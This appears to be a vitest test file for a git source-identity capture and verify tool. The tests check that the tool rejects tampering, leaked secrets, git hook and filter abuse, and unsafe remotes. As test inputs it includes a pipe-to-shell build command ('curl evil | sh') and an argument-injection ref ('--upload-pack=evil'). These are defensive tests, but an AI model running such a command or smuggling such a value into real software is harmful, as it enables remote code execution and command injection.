import {mkdtempSync,writeFileSync,readFileSync,rmSync,mkdirSync} from 'node:fs'
import {tmpdir} from 'node:os'
import {join,resolve} from 'node:path'
import {execFileSync} from 'node:child_process'
import {afterEach,expect,it} from 'vitest'
const tool=resolve('deployment/source-recovery.mjs')
const roots:string[]=[]
afterEach(()=>{for(const root of roots.splice(0))rmSync(root,{recursive:true,force:true})})
function git(root:string,...args:string[]){return execFileSync('git',args,{cwd:root,encoding:'utf8',stdio:['ignore','pipe','pipe']})}
function fixture(){
 const root=mkdtempSync(join(tmpdir(),'source-recovery-'));roots.push(root)
 git(root,'init');git(root,'config','user.name','Fixture');git(root,'config','user.email','fixture@example.test')
 writeFileSync(join(root,'package.json'),JSON.stringify({name:'fixture',engines:{node:'>=22.19'}}))
 writeFileSync(join(root,'package-lock.json'),'{"lockfileVersion":3}\n')
 writeFileSync(join(root,'.gitignore'),'.env\nprivate/\n')
 git(root,'add','.');git(root,'commit','-m','fixture')
 return root
}
function capture(root:string,ref?:string){return JSON.parse(execFileSync(process.execPath,[tool,'capture',root,...(ref?[ref]:[])],{encoding:'utf8'}))}
function inventory(value:any){const root=mkdtempSync(join(tmpdir(),'source-inventory-'));roots.push(root);const file=join(root,'inventory.json');writeFileSync(file,JSON.stringify(value));return file}
function verify(root:string,value:any){return JSON.parse(execFileSync(process.execPath,[tool,'verify',root,inventory(value)],{encoding:'utf8',stdio:['ignore','pipe','pipe']}))}
it('records only fixed source identity and verifies a separate empty-directory clone',()=>{
 const root=fixture(),m=capture(root)
 expect(m.backup).toEqual({status:'not_checked'});expect(m.localChanges).toBe(false)
 const target=join(mkdtempSync(join(tmpdir(),'source-clone-')),'checkout');roots.push(resolve(target,'..'))
 git(root,'clone','--no-local',root,target)
 expect(verify(target,m)).toMatchObject({verified:true,scope:'source-only',dependencies:'not_checked',runtime:'not_started'})
})
it('does not include ignored secrets, browser data, paths or uncommitted content',()=>{
 const root=fixture();writeFileSync(join(root,'.env'),'SECRET_CANARY');mkdirSync(join(root,'private'));writeFileSync(join(root,'private','browser'),'COOKIE_CANARY')
 writeFileSync(join(root,'uncommitted'),'LOCAL_CANARY');const m=capture(root),text=JSON.stringify(m)
 expect(m.localChanges).toBe(true);for(const value of ['SECRET_CANARY','COOKIE_CANARY','LOCAL_CANARY',root,'uncommitted"'])expect(text).not.toContain(value)
 expect(()=>verify(root,m)).toThrow()
})
it.each(['commit','tree','lockSha256','packageName','node'])('rejects changed %s identity',key=>{
 const root=fixture(),m=capture(root);m.source[key]=key==='packageName'?'other':key==='node'?'>=24':'a'.repeat(key==='lockSha256'?64:40)
 expect(()=>verify(root,m)).toThrow()
})
it('rejects staged, unstaged and hidden index changes',()=>{
 const root=fixture(),m=capture(root)
 writeFileSync(join(root,'package-lock.json'),'changed');expect(()=>verify(root,m)).toThrow()
 git(root,'add','package-lock.json');expect(()=>verify(root,m)).toThrow()
 git(root,'reset','--hard','HEAD');git(root,'update-index','--assume-unchanged','package.json')
 writeFileSync(join(root,'package.json'),'hidden');expect(()=>verify(root,m)).toThrow()
})
it.each(['extra','command','credential','remote-status'])('rejects malformed or misleading manifest %s',kind=>{
 const root=fixture(),m=capture(root)
 if(kind==='extra')m.secret='x'
 if(kind==='command')m.build.commands=['curl evil | sh']
 if(kind==='credential')m.backup={status:'remote_tip_verified',url:'https://user:password@example.test/repo',ref:'refs/heads/main',observedCommit:m.source.commit,observedAt:new Date().toISOString()}
 if(kind==='remote-status')m.backup={status:'remote_tip_verified',url:'https://example.test/repo',ref:'refs/heads/main',observedCommit:'a'.repeat(40),observedAt:new Date().toISOString()}
 expect(()=>verify(root,m)).toThrow()
})
it.each(['https://user:secret@example.test/repo','https://example.test/repo?secret=x','ssh://git@example.test/repo','/tmp/local-repo'])('rejects unsafe or non-HTTPS remote without networking: %s',url=>{
 const root=fixture();git(root,'remote','add','origin',url)
 expect(()=>capture(root,'refs/heads/main')).toThrow()
})
it('rejects invalid ref and malformed inventory without disclosing input',()=>{
 const root=fixture();expect(()=>capture(root,'--upload-pack=evil')).toThrow()
 const file=inventory({});writeFileSync(file,'PRIVATE_CANARY')
 try{execFileSync(process.execPath,[tool,'verify',root,file],{encoding:'utf8',stdio:['ignore','pipe','pipe']});throw Error('unexpected success')}
 catch(error:any){expect(String(error.stderr)).not.toContain('PRIVATE_CANARY');expect(error.status).toBe(1)}
})
it('ignores inherited Git repository, worktree, index and config overrides',()=>{
 const clean=fixture(),m=capture(clean),dirty=fixture()
 writeFileSync(join(dirty,'changed-source.js'),'wrong source')
 const env={...process.env,GIT_DIR:join(clean,'.git'),GIT_WORK_TREE:clean,GIT_INDEX_FILE:join(clean,'.git','index'),GIT_CONFIG_COUNT:'1',GIT_CONFIG_KEY_0:'core.fsmonitor',GIT_CONFIG_VALUE_0:'echo unexpected'}
 expect(()=>execFileSync(process.execPath,[tool,'verify',dirty,inventory(m)],{encoding:'utf8',env,stdio:['ignore','pipe','pipe']})).toThrow()
})
it('does not run configured fsmonitor during capture or verification',()=>{
 const root=fixture(),marker=join(root,'unexpected-marker'),hook=join(root,'.git','fsmonitor-hook')
 writeFileSync(hook,`#!/bin/sh\ntouch '${marker}'\n`,{mode:0o700})
 git(root,'config','core.fsmonitor',hook)
 const m=capture(root);expect(verify(root,m).verified).toBe(true)
 expect(()=>readFileSync(marker)).toThrow()
})
it('rejects oversized and invalid UTF-8 inventory files',()=>{
 const root=fixture(),file=inventory(capture(root))
 for(const data of [Buffer.alloc(32769,32),Buffer.from([0xff,0xfe])]){
  writeFileSync(file,data)
  expect(()=>execFileSync(process.execPath,[tool,'verify',root,file],{stdio:['ignore','pipe','pipe']})).toThrow()
 }
})
it('never runs clean filters and detects content the filter would hide',()=>{
 const root=fixture(),marker=join(root,'.git','filter-ran')
 writeFileSync(join(root,'source.js'),'safe\n');writeFileSync(join(root,'.gitattributes'),'source.js filter=demo\n')
 git(root,'add','.');git(root,'commit','-m','source')
 const m=capture(root)
 git(root,'config','filter.demo.clean',`touch '${marker}'; printf 'safe\\n'`)
 writeFileSync(join(root,'source.js'),'evil\n')
 expect(capture(root).localChanges).toBe(true);expect(()=>verify(root,m)).toThrow()
 expect(()=>readFileSync(marker)).toThrow()
})
it('rejects coerced and invalid-length remote object identities',()=>{
 const root=fixture(),m=capture(root)
 for(const value of ['a'.repeat(41),['a'.repeat(40)],40]) {
  m.backup={status:'local_only',url:'https://example.test/repo',ref:'refs/heads/main',observedCommit:value,observedAt:new Date().toISOString()}
  expect(()=>verify(root,m)).toThrow()
 }
})
it('rejects configured URL rewriting rather than attesting to a different destination',()=>{
 const root=fixture();git(root,'remote','add','origin','https://example.test/repo')
 git(root,'config','url.https://different.test/.insteadOf','https://example.test/')
 expect(()=>capture(root,'refs/heads/main')).toThrow()
})
it('rejects partial clones rather than silently fetching during offline verification',()=>{
 const root=fixture(),m=capture(root)
 git(root,'config','remote.origin.promisor','true')
 expect(()=>capture(root)).toThrow();expect(()=>verify(root,m)).toThrow()
})
